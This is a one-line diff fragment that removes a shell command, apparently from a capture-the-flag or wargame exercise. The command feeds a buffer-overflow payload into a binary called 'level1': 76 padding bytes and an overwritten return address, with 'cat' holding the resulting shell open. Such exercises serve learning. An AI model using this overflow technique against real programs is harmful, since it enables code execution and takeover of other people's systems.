@@ -1,1 +1,0 @@
-(python -c "print('A'*76 + '\x44\x84\x04\x08')"; cat) | ./level1
